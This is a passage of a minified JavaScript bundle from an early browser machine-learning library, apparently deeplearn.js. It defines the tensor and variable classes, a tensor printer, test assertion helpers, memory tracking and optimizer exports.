l=t[c.id];t[c.id]=l.add(u),l.dispose()}}}}},{"./util":143}],137:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s},s=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},a=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var u=t("./doc"),c=t("./environment"),l=t("./ops/ops"),h=t("./tensor_util"),p=t("./util"),d=function(){function t(t,e,n){if(this.shape=t,this.dtype=e,this.values=n,null!=n){var r=n.length,i=p.sizeFromShape(t);p.assert(r===i,"Length of values '"+r+"' does not match the size inferred by the shape '"+i+"'")}this.values=n||p.getTypedArrayFromDType(e,p.sizeFromShape(t)),this.strides=x(t),this.size=p.sizeFromShape(t)}return t.prototype.set=function(t){for(var e=[],n=1;n<arguments.length;n++)e[n-1]=arguments[n];0===e.length&&(e=[0]),p.assert(e.length===this.rank,"The number of provided coordinates ("+e.length+") must match the rank ("+this.rank+")");var r=this.locToIndex(e);this.values[r]=t},t.prototype.get=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];0===t.length&&(t=[0]);for(var n=t[t.length-1],r=0;r<t.length-1;++r)n+=this.strides[r]*t[r];return this.values[n]},t.prototype.locToIndex=function(t){if(0===this.rank)return 0;if(1===this.rank)return t[0];for(var e=t[t.length-1],n=0;n<t.length-1;++n)e+=this.strides[n]*t[n];return e},t.prototype.indexToLoc=function(t){if(0===this.rank)return[];if(1===this.rank)return[t];for(var e=new Array(this.shape.length),n=0;n<e.length-1;++n)e[n]=Math.floor(t/this.strides[n]),t-=e[n]*this.strides[n];return e[e.length-1]=t,e},Object.defineProperty(t.prototype,"rank",{get:function(){return this.shape.length},enumerable:!0,configurable:!0}),t.prototype.toTensor=function(){return f.make(this.shape,{values:this.values},this.dtype)},o([u.doc({heading:"Tensors",subheading:"Creation"})],t.prototype,"set",null),o([u.doc({heading:"Tensors",subheading:"Creation"})],t.prototype,"get",null),o([u.doc({heading:"Tensors",subheading:"Creation"})],t.prototype,"toTensor",null),t=o([u.doc({heading:"Tensors",subheading:"Classes"})],t)}();n.TensorBuffer=d;var f=function(){function t(t,n,r,i){this.isDisposed=!1,this.size=p.sizeFromShape(t),null!=r&&p.assert(this.size===r.length,"Constructing tensor of shape ("+this.size+") should match the length of values ("+r.length+")"),this.shape=t,this.dtype=n||"float32",this.strides=x(t),this.dataId=null!=i?i:{},this.id=e.nextId++,this.rankType=this.rank<5?this.rank.toString():"higher",c.ENV.engine.registerTensor(this),null!=r&&c.ENV.engine.write(this.dataId,r)}return e=t,t.ones=function(t,e){return l.ones(t,e)},t.zeros=function(t,e){return l.zeros(t,e)},t.onesLike=function(t){return l.onesLike(t)},t.zerosLike=function(t){return l.zerosLike(t)},t.like=function(t){return l.clone(t)},t.make=function(t,n,r){return new e(t,r,n.values,n.dataId)},t.fromPixels=function(t,e){return void 0===e&&(e=3),l.fromPixels(t,e)},t.rand=function(t,e,n){return l.rand(t,e,n)},t.randNormal=function(t,e,n,r,i){return void 0===e&&(e=0),void 0===n&&(n=1),l.randomNormal(t,e,n,r,i)},t.randTruncatedNormal=function(t,e,n,r,i){return void 0===e&&(e=0),void 0===n&&(n=1),l.truncatedNormal(t,e,n,r,i)},t.randUniform=function(t,e,n,r){return l.randomUniform(t,e,n,r)},t.prototype.flatten=function(){return this.throwIfDisposed(),this.as1D()},t.prototype.asScalar=function(){return this.throwIfDisposed(),p.assert(1===this.size,"The array must have only 1 element."),this.reshape([])},t.prototype.as1D=function(){return this.throwIfDisposed(),this.reshape([this.size])},t.prototype.as2D=function(t,e){return this.throwIfDisposed(),this.reshape([t,e])},t.prototype.as3D=function(t,e,n){return this.throwIfDisposed(),this.reshape([t,e,n])},t.prototype.as4D=function(t,e,n,r){return this.throwIfDisposed(),this.reshape([t,e,n,r])},t.prototype.asType=function(t){return this.throwIfDisposed(),l.cast(this,t)},Object.defineProperty(t.prototype,"rank",{get:function(){return this.shape.length},enumerable:!0,configurable:!0}),t.prototype.get=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.throwIfDisposed(),0===t.length&&(t=[0]);for(var n=t[t.length-1],r=0;r<t.length-1;++r)n+=this.strides[r]*t[r];return this.dataSync()[n]},t.prototype.val=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return s(this,void 0,void 0,(function(){return a(this,(function(e){switch(e.label){case 0:return 0===t.length&&(t=[0]),this.throwIfDisposed(),[4,this.data()];case 1:return e.sent(),[2,this.get.apply(this,t)]}}))}))},t.prototype.locToIndex=function(t){if(this.throwIfDisposed(),0===this.rank)return 0;if(1===this.rank)return t[0];for(var e=t[t.length-1],n=0;n<t.length-1;++n)e+=this.strides[n]*t[n];return e},t.prototype.indexToLoc=function(t){if(this.throwIfDisposed(),0===this.rank)return[];if(1===this.rank)return[t];for(var e=new Array(this.shape.length),n=0;n<e.length-1;++n)e[n]=Math.floor(t/this.strides[n]),t-=e[n]*this.strides[n];return e[e.length-1]=t,e},t.prototype.getValues=function(){return this.dataSync()},t.prototype.getValuesAsync=function(){return this.data()},t.prototype.buffer=function(){return l.buffer(this.shape,this.dtype,this.dataSync())},t.prototype.data=function(){return s(this,void 0,void 0,(function(){return a(this,(function(t){return this.throwIfDisposed(),[2,c.ENV.engine.read(this.dataId)]}))}))},t.prototype.dataSync=function(){return this.throwIfDisposed(),c.ENV.engine.readSync(this.dataId)},t.prototype.dispose=function(){this.isDisposed||(this.isDisposed=!0,c.ENV.engine.disposeTensor(this))},t.prototype.throwIfDisposed=function(){if(this.isDisposed)throw new Error("Tensor is disposed.")},t.prototype.toFloat=function(){return this.asType("float32")},t.prototype.toInt=function(){return this.asType("int32")},t.prototype.toBool=function(){return this.asType("bool")},t.prototype.print=function(t){return void 0===t&&(t=!1),l.print(this,t)},t.prototype.reshape=function(t){return this.throwIfDisposed(),l.reshape(this,t)},t.prototype.reshapeAs=function(t){return this.throwIfDisposed(),this.reshape(t.shape)},t.prototype.expandDims=function(t){return void 0===t&&(t=0),l.expandDims(this,t)},t.prototype.squeeze=function(t){return this.throwIfDisposed(),l.squeeze(this,t)},t.prototype.clone=function(){return this.throwIfDisposed(),l.clone(this)},t.prototype.toString=function(){return h.tensorToString(this,!0)},t.prototype.tile=function(t){return this.throwIfDisposed(),l.tile(this,t)},t.prototype.gather=function(t,e){return void 0===e&&(e=0),this.throwIfDisposed(),l.gather(this,t)},t.prototype.matMul=function(t,e,n){return void 0===e&&(e=!1),void 0===n&&(n=!1),this.throwIfDisposed(),l.matMul(this,t,e,n)},t.prototype.norm=function(t,e,n){return void 0===t&&(t="euclidean"),void 0===e&&(e=null),void 0===n&&(n=!1),this.throwIfDisposed(),l.norm(this,t,e,n)},t.prototype.slice=function(t,e){return this.throwIfDisposed(),l.slice(this,t,e)},t.prototype.reverse=function(t){return this.throwIfDisposed(),l.reverse(this,t)},t.prototype.concat=function(t,e){return void 0===e&&(e=0),this.throwIfDisposed(),l.concat([this,t],e)},t.prototype.stack=function(t,e){return void 0===e&&(e=0),l.stack([this,t],e)},t.prototype.pad=function(t,e){return void 0===e&&(e=0),l.pad(this,t,e)},t.prototype.batchNormalization=function(t,e,n,r,i){return void 0===n&&(n=.001),this.throwIfDisposed(),l.batchNormalization(this,t,e,n,r,i)},t.prototype.logSumExp=function(t,e){return void 0===t&&(t=null),void 0===e&&(e=!1),this.throwIfDisposed(),l.logSumExp(this,t,e)},t.prototype.sum=function(t,e){return void 0===t&&(t=null),void 0===e&&(e=!1),this.throwIfDisposed(),l.sum(this,t,e)},t.prototype.mean=function(t,e){return void 0===t&&(t=null),void 0===e&&(e=!1),this.throwIfDisposed(),l.mean(this,t,e)},t.prototype.min=function(t,e){return void 0===t&&(t=null),void 0===e&&(e=!1),this.throwIfDisposed(),l.min(this,t,e)},t.prototype.max=function(t,e){return void 0===t&&(t=null),void 0===e&&(e=!1),this.throwIfDisposed(),l.max(this,t,e)},t.prototype.argMin=function(t){return void 0===t&&(t=null),this.throwIfDisposed(),l.argMin(this,t)},t.prototype.argMax=function(t){return void 0===t&&(t=null),this.throwIfDisposed(),l.argMax(this,t)},t.prototype.add=function(t){return this.throwIfDisposed(),l.add(this,t)},t.prototype.addStrict=function(t){return this.throwIfDisposed(),l.addStrict(this,t)},t.prototype.sub=function(t){return this.throwIfDisposed(),l.sub(this,t)},t.prototype.subStrict=function(t){return this.throwIfDisposed(),l.subStrict(this,t)},t.prototype.pow=function(t){return this.throwIfDisposed(),l.pow(this,t)},t.prototype.powStrict=function(t){return this.throwIfDisposed(),l.powStrict(this,t)},t.prototype.mul=function(t){return this.throwIfDisposed(),l.mul(this,t)},t.prototype.mulStrict=function(t){return this.throwIfDisposed(),l.mulStrict(this,t)},t.prototype.div=function(t){return this.throwIfDisposed(),l.div(this,t)},t.prototype.divStrict=function(t){return this.throwIfDisposed(),l.divStrict(this,t)},t.prototype.minimum=function(t){return this.throwIfDisposed(),l.minimum(this,t)},t.prototype.minimumStrict=function(t){return this.throwIfDisposed(),l.minimumStrict(this,t)},t.prototype.maximum=function(t){return this.throwIfDisposed(),l.maximum(this,t)},t.prototype.maximumStrict=function(t){return this.throwIfDisposed(),l.maximumStrict(this,t)},t.prototype.transpose=function(t){return this.throwIfDisposed(),l.transpose(this,t)},t.prototype.notEqual=function(t){return this.throwIfDisposed(),l.notEqual(this,t)},t.prototype.notEqualStrict=function(t){return this.throwIfDisposed(),l.notEqualStrict(this,t)},t.prototype.less=function(t){return this.throwIfDisposed(),l.less(this,t)},t.prototype.lessStrict=function(t){return this.throwIfDisposed(),l.lessStrict(this,t)},t.prototype.equal=function(t){return this.throwIfDisposed(),l.equal(this,t)},t.prototype.equalStrict=function(t){return this.throwIfDisposed(),l.equalStrict(this,t)},t.prototype.lessEqual=function(t){return this.throwIfDisposed(),l.lessEqual(this,t)},t.prototype.lessEqualStrict=function(t){return this.throwIfDisposed(),l.lessEqualStrict(this,t)},t.prototype.greater=function(t){return this.throwIfDisposed(),l.greater(this,t)},t.prototype.greaterStrict=function(t){return this.throwIfDisposed(),l.greaterStrict(this,t)},t.prototype.greaterEqual=function(t){return this.throwIfDisposed(),l.greaterEqual(this,t)},t.prototype.greaterEqualStrict=function(t){return this.throwIfDisposed(),l.greaterEqualStrict(this,t)},t.prototype.logicalAnd=function(t){return this.throwIfDisposed(),l.logicalAnd(this,t)},t.prototype.logicalOr=function(t){return this.throwIfDisposed(),l.logicalOr(this,t)},t.prototype.logicalXor=function(t){return this.throwIfDisposed(),l.logicalXor(this,t)},t.prototype.where=function(t,e){return this.throwIfDisposed(),l.where(t,this,e)},t.prototype.neg=function(){return this.throwIfDisposed(),l.neg(this)},t.prototype.ceil=function(){return this.throwIfDisposed(),l.ceil(this)},t.prototype.floor=function(){return this.throwIfDisposed(),l.floor(this)},t.prototype.exp=function(){return this.throwIfDisposed(),l.exp(this)},t.prototype.log=function(){return this.throwIfDisposed(),l.log(this)},t.prototype.sqrt=function(){return this.throwIfDisposed(),l.sqrt(this)},t.prototype.square=function(){return this.throwIfDisposed(),l.square(this)},t.prototype.abs=function(){return this.throwIfDisposed(),l.abs(this)},t.prototype.clipByValue=function(t,e){return this.throwIfDisposed(),l.clipByValue(this,t,e)},t.prototype.relu=function(){return this.throwIfDisposed(),l.relu(this)},t.prototype.elu=function(){return this.throwIfDisposed(),l.elu(this)},t.prototype.selu=function(){return this.throwIfDisposed(),l.selu(this)},t.prototype.leakyRelu=function(t){return void 0===t&&(t=.2),this.throwIfDisposed(),l.leakyRelu(this,t)},t.prototype.prelu=function(t){return this.throwIfDisposed(),l.prelu(this,t)},t.prototype.sigmoid=function(){return this.throwIfDisposed(),l.sigmoid(this)},t.prototype.sin=function(){return this.throwIfDisposed(),l.sin(this)},t.prototype.cos=function(){return this.throwIfDisposed(),l.cos(this)},t.prototype.tan=function(){return this.throwIfDisposed(),l.tan(this)},t.prototype.asin=function(){return this.throwIfDisposed(),l.asin(this)},t.prototype.acos=function(){return this.throwIfDisposed(),l.acos(this)},t.prototype.atan=function(){return this.throwIfDisposed(),l.atan(this)},t.prototype.sinh=function(){return this.throwIfDisposed(),l.sinh(this)},t.prototype.cosh=function(){return this.throwIfDisposed(),l.cosh(this)},t.prototype.tanh=function(){return this.throwIfDisposed(),l.tanh(this)},t.prototype.step=function(t){return void 0===t&&(t=0),this.throwIfDisposed(),l.step(this,t)},t.prototype.softmax=function(t){return void 0===t&&(t=-1),this.throwIfDisposed(),l.softmax(this,t)},t.prototype.resizeBilinear=function(t,e){return void 0===e&&(e=!1),this.throwIfDisposed(),l.image.resizeBilinear(this,t,e)},t.prototype.conv1d=function(t,e,n,r){return this.throwIfDisposed(),l.conv1d(this,t,e,n,r)},t.prototype.conv2d=function(t,e,n,r){return this.throwIfDisposed(),l.conv2d(this,t,e,n,r)},t.prototype.conv2dTranspose=function(t,e,n,r,i){return this.throwIfDisposed(),l.conv2dTranspose(this,t,e,n,r,i)},t.prototype.depthwiseConv2D=function(t,e,n,r,i){return void 0===r&&(r=[1,1]),this.throwIfDisposed(),l.depthwiseConv2d(this,t,e,n,r,i)},t.prototype.avgPool=function(t,e,n,r){return this.throwIfDisposed(),l.avgPool(this,t,e,n,r)},t.prototype.maxPool=function(t,e,n,r){return this.throwIfDisposed(),l.maxPool(this,t,e,n,r)},t.prototype.minPool=function(t,e,n,r){return this.throwIfDisposed(),l.minPool(this,t,e,n,r)},t.prototype.localResponseNormalization=function(t,e,n,r,i){return void 0===t&&(t=5),void 0===e&&(e=1),void 0===n&&(n=1),void 0===r&&(r=.5),void 0===i&&(i="acrossChannels"),l.localResponseNormalization(this,t,e,n,r,i)},t.prototype.variable=function(t,e,n){return void 0===t&&(t=!0),this.throwIfDisposed(),b.variable(this,t,e,n)},t.nextId=0,o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"flatten",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"asScalar",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"as1D",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"as2D",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"as3D",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"as4D",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"asType",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"buffer",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"data",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"dataSync",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"dispose",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"toFloat",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"toInt",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"toBool",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"print",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"reshape",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"reshapeAs",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"expandDims",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"squeeze",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"clone",null),o([u.doc({heading:"Tensors",subheading:"Classes"})],t.prototype,"toString",null),t=e=o([u.doc({heading:"Tensors",subheading:"Classes"})],t);var e}();n.Tensor=f,n.NDArray=f;var y=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.new=function(t,e){return l.scalar(t,e)},e}(f);n.Scalar=y;var m=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.new=function(t,e){return l.tensor1d(t,e)},e}(f);n.Tensor1D=m,n.Array1D=m;var v=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.new=function(t,e,n){return l.tensor2d(e,t,n)},e}(f);n.Tensor2D=v,n.Array2D=v;var g=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.new=function(t,e,n){return l.tensor3d(e,t,n)},e}(f);n.Tensor3D=g,n.Array3D=g;var _=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.new=function(t,e,n){return l.tensor4d(e,t,n)},e}(f);n.Tensor4D=_,n.Array4D=_;var b=function(t){function e(e,r,i){void 0===r&&(r=!0);var o=t.call(this,e.shape,e.dtype,null,e.dataId)||this;return o.trainable=r,o.name=i,null==o.name&&(o.name=n.nextVarId.toString(),n.nextVarId++),c.ENV.engine.registerVariable(o),o}return i(e,t),n=e,e.variable=function(t,e,r,i){return void 0===e&&(e=!0),null!=i&&i!==t.dtype&&(t=t.asType(i)),new n(t,e,r)},e.prototype.assign=function(t){if(t.dtype!==this.dtype)throw new Error("dtype of the new value ("+t.dtype+") and previous value ("+this.dtype+") must match");if(!p.arraysEqual(t.shape,this.shape))throw new Error("shape of the new value ("+t.shape+") and previous value ("+this.shape+") must match");c.ENV.engine.disposeTensor(this),this.dataId=t.dataId,c.ENV.engine.registerTensor(this)},e.nextVarId=0,o([u.doc({heading:"Tensors",subheading:"Classes"})],e.prototype,"assign",null),o([u.doc({heading:"Tensors",subheading:"Creation"})],e,"variable",null),e=n=o([u.doc({heading:"Tensors",subheading:"Classes"})],e);var n}(f);n.Variable=b;var w=b.variable;function x(t){var e=t.length;if(e<2)return[];var n=new Array(e-1);n[e-2]=t[e-1];for(var r=e-3;r>=0;--r)n[r]=n[r+1]*t[r+1];return n}n.variable=w},{"./doc":25,"./environment":27,"./ops/ops":114,"./tensor_util":138,"./util":143}],138:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./util");function i(t,e){return r.rightPad(parseFloat(t.toFixed(7)).toString(),e)}function o(t,e,n,r,s){void 0===s&&(s=!0);var a=e[0],u=e.length;if(0===u)return[t[0].toString()];if(1===u){if(a>20){var c=Array.from(t.subarray(0,3)),l=Array.from(t.subarray(a-3,a));return["["+c.map((function(t,e){return i(t,r[e])})).join(", ")+", ..., "+l.map((function(t,e){return i(t,r[a-3+e])})).join(", ")+"]"]}return["["+Array.from(t).map((function(t,e){return i(t,r[e])})).join(", ")+"]"]}var h=e.slice(1),p=n.slice(1),d=n[0],f=[];if(a>20){for(var y=0;y<3;y++){var m=(v=y*d)+d;f.push.apply(f,o(t.subarray(v,m),h,p,r,!1))}f.push("...");for(y=a-3;y<a;y++){m=(v=y*d)+d;f.push.apply(f,o(t.subarray(v,m),h,p,r,y===a-1))}}else for(y=0;y<a;y++){var v;m=(v=y*d)+d;f.push.apply(f,o(t.subarray(v,m),h,p,r,y===a-1))}var g=2===u?",":"";f[0]="["+f[0]+g;for(y=1;y<f.length-1;y++)f[y]=" "+f[y]+g;var _=",\n";for(y=2;y<u;y++)_+="\n";return f[f.length-1]=" "+f[f.length-1]+"]"+(s?"":_),f}n.tensorToString=function(t,e){var n=t.dataSync(),r=function(t){var e=t.dataSync(),n=t.size,r=t.strides[t.strides.length-1],o=new Array(r).fill(0);if(t.rank>1)for(var s=0;s<n/r;s++)for(var a=s*r,u=0;u<r;u++)o[u]=Math.max(o[u],i(e[a+u],0).length);return o}(t),s=o(n,t.shape,t.strides,r),a=["Tensor"];return e&&(a.push("  dtype: "+t.dtype),a.push("  rank: "+t.rank),a.push("  shape: ["+t.shape+"]"),a.push("  values:")),a.push(s.map((function(t){return"    "+t})).join("\n")),a.join("\n")}},{"./util":143}],139:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./environment"),i=t("./kernels/backend_cpu"),o=t("./kernels/backend_webgl"),s=t("./tensor"),a=t("./util");function u(t,e,r){if(void 0===r&&(r=n.TEST_EPSILON),t instanceof s.Tensor||e instanceof s.Tensor){if(t instanceof s.Tensor&&e instanceof s.Tensor){if(t.dtype!==e.dtype)throw new Error("Arrays are of different type actual: "+t.dtype+" vs expected: "+e.dtype+".");if(!a.arraysEqual(t.shape,e.shape))throw new Error("Arrays are of different shape actual: "+t.shape+" vs expected: "+e.shape+".")}}else{var i=t.constructor.name,o=e.constructor.name;if(i!==o)throw new Error("Arrays are of different type actual: "+i+" vs expected: "+o)}var u,l;if(u=t instanceof s.Tensor?t.dataSync():t,l=e instanceof s.Tensor?e.dataSync():e,u.length!==l.length)throw new Error("Arrays have different lengths actual: "+u.length+" vs expected: "+l.length+".\nActual:   "+u+".\nExpected: "+l+".");for(var h=0;h<l.length;++h){var p=u[h],d=l[h];if(!c(p,Number(d),r))throw new Error("Arrays differ: actual["+h+"] = "+p+", expected["+h+"] = "+d+".\nActual:   "+u+".\nExpected: "+l+".")}}function c(t,e,n){return!(!isNaN(t)||!isNaN(e))||!(isNaN(t)||isNaN(e)||Math.abs(t-e)>n)}n.WEBGL_ENVS=[{BACKEND:"webgl",WEBGL_FLOAT_TEXTURE_ENABLED:!0,WEBGL_VERSION:1},{BACKEND:"webgl",WEBGL_FLOAT_TEXTURE_ENABLED:!0,WEBGL_VERSION:2}],n.CPU_ENVS=[{BACKEND:"cpu"}],n.ALL_ENVS=n.WEBGL_ENVS.concat(n.CPU_ENVS),n.TEST_EPSILON=.001,n.expectArraysClose=u,n.expectArraysEqual=function(t,e){return u(t,e,0)},n.expectNumbersClose=function(t,e,r){if(void 0===r&&(r=n.TEST_EPSILON),!c(t,e,r))throw new Error("Numbers differ: actual === "+t+", expected === "+e)},n.expectValuesInRange=function(t,e,n){var r;r=t instanceof s.Tensor?t.dataSync():t;for(var i=0;i<r.length;i++)if(r[i]<e||r[i]>n)throw new Error("Value out of range:"+r[i]+" low: "+e+", high: "+n)},n.describeWithFlags=function(t,e,n){e.forEach((function(e){!function(t,e,n){describe(t,(function(){beforeEach((function(){r.ENV.setFeatures(n||{}),r.ENV.addCustomBackend("webgl",(function(){return new o.MathBackendWebGL})),r.ENV.addCustomBackend("cpu",(function(){return new i.MathBackendCPU})),n&&null!=n.BACKEND&&r.Environment.setBackend(n.BACKEND),r.ENV.engine.startScope()})),afterEach((function(){r.ENV.engine.endScope(null),r.ENV.reset()})),e()}))}(t+" "+JSON.stringify(e),n,e)}))},n.assertIsNan=function(t,e){if(!a.isValNaN(t,e))throw new Error("Value "+t+" does not represent NaN for dtype "+e)}},{"./environment":27,"./kernels/backend_cpu":61,"./kernels/backend_webgl":62,"./tensor":137,"./util":143}],140:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("./doc"),o=t("./environment"),s=t("./util"),a=function(){function t(){}return t.tidy=function(t,e,n){void 0===n&&(n=!1);var r=null;if(null==e){if("function"!=typeof t)throw new Error("Please provide a function to dl.tidy()");e=t}else{if("string"!=typeof t&&!(t instanceof String))throw new Error("When calling with two arguments, the first argument to dl.tidy() must be a string");if("function"!=typeof e)throw new Error("When calling with two arguments, the 2nd argument to dl.tidy() must be a function");r=t}o.ENV.engine.startScope(r,n);var i=e();return i instanceof Promise&&console.warn("Returning a promise inside of tidy is dangerous. This will be a run-time error in 0.6.0"),o.ENV.engine.endScope(i,n),i},t.dispose=function(t){s.extractTensorsFromAny(t).forEach((function(t){return t.dispose()}))},t.keep=function(t){return o.ENV.engine.keep(t)},t.time=function(t){return o.ENV.engine.time(t)},r([i.doc({heading:"Performance",subheading:"Memory"})],t,"tidy",null),r([i.doc({heading:"Performance",subheading:"Memory"})],t,"keep",null),r([i.doc({heading:"Performance",subheading:"Timing"})],t,"time",null),t}();n.Tracking=a},{"./doc":25,"./environment":27,"./util":143}],141:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./optimizers/adadelta_optimizer"),i=t("./optimizers/adagrad_optimizer"),o=t("./optimizers/adam_optimizer"),s=t("./optimizers/adamax_optimizer"),a=t("./optimizers/momentum_optimizer"),u=t("./optimizers/optimizer_constructors"),c=t("./optimizers/rmsprop_optimizer"),l=t("./optimizers/sgd_optimizer");a.MomentumOptimizer,l.SGDOptimizer,r.AdadeltaOptimizer,i.AdagradOptimizer,c.RMSPropOptimizer,s.AdamaxOptimizer,o.AdamOptimizer,n.train={sgd:u.OptimizerConstructors.sgd,momentum:u.OptimizerConstructors.momentum,adadelta:u.OptimizerConstructors.adadelta,adagrad:u.OptimizerConstructors.adagrad,rmsprop:u.OptimizerConstructors.rmsprop,adamax:u.OptimizerConstructors.adamax,adam:u.OptimizerConstructors.adam}},{"./optimizers/adadelta_optimizer":126,"./optimizers/adagrad_optimizer":127,"./optimizers/adam_optimizer":128,"./optimizers/adamax_optimizer":129,"./optimizers/momentum_optimizer":130,"./optimizers/optimizer_constructors":132,"./optimizers/rmsprop_optimizer":133,"./optimizers/sgd_optimizer":134}],142:[function(t,e,n){"use strict";var r,i,o;Object.defineProperty(n,"__esModule",{value:!0}),function(t){t.float32="float32",t.int32="int32",t.bool="bool"}(n.DType||(n.DType={})),function(t){t.R0="R0",t.R1="R1",t.R2="R2",t.R3="R3",t.R4="R4"}(n.Rank||(n.Rank={})),function(t){t.float32="float32",t.int32="int32",t.bool="int32"}(r||(r={})),function(t){t.float32="float32",t.int32="int32",t.bool="bool"}(i||(i={})),function(t){t.float32="float32",t.int32="float32",t.bool="float32"}(o||(o={}));var s={float32:o,int32:r,bool:i};function a(t,e){return s[t][e]}n.upcastType=a,n.sumOutType=function(t){return a(t,"int32")}},{}],143:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./tensor");function i(t){for(var e=t.length,n=0,r=0;e>0;)r=Math.random()*e|0,n=t[--e],t[e]=t[r],t[r]=n}function o(t,e){if(!t)throw new Error(e)}function s(t,e){if(void 0===e&&(e=[]),Array.isArray(t))for(var n=0;n<t.length;++n)s(t[n],e);else e.push(t);return e}function a(t,e){if(t.length!==e.length)return!1;for(var n=0;n<t.length;n++)if(t[n]!==e[n])return!1;return!0}function u(t,e,n){t[decodeURIComponent(e)]=decodeURIComponent(n||"")}function c(t){if("float32"===t)return n.NAN_FLOAT32;if("int32"===t)return n.NAN_INT32;if("bool"===t)return n.NAN_BOOL;throw new Error("Unknown dtype "+t)}function l(t,e){if(isNaN(t))return!0;if("float32"===e)return!1;if("int32"===e)return t===n.NAN_INT32;if("bool"===e)return t===n.NAN_BOOL;throw new Error("Unknown dtype "+e)}function h(t){return t instanceof Float32Array||t instanceof Int32Array||t instanceof Uint8Array}function p(t){if(null==t)return[];if(t instanceof r.Tensor)return[t];var e,n=[],i=t;if(e=i,!Array.isArray(e)&&"object"!=typeof e)return[];for(var o in i){var a=s(i[o]).filter((function(t){return t instanceof r.Tensor}));n.push.apply(n,a)}return n}n.shuffle=i,n.clamp=function(t,e,n){return Math.max(t,Math.min(e,n))},n.randUniform=function(t,e){return Math.random()*(e-t)+t},n.distSquared=function(t,e){for(var n=0,r=0;r<t.length;r++){var i=Number(t[r])-Number(e[r]);n+=i*i}return n},n.assert=o,n.assertShapesMatch=function(t,e,n){void 0===n&&(n=""),o(a(t,e),n+"Shapes "+t+" and "+e+" must match")},n.assertTypesMatch=function(t,e){o(t.dtype===e.dtype,"The dtypes of the first ("+t.dtype+") and second 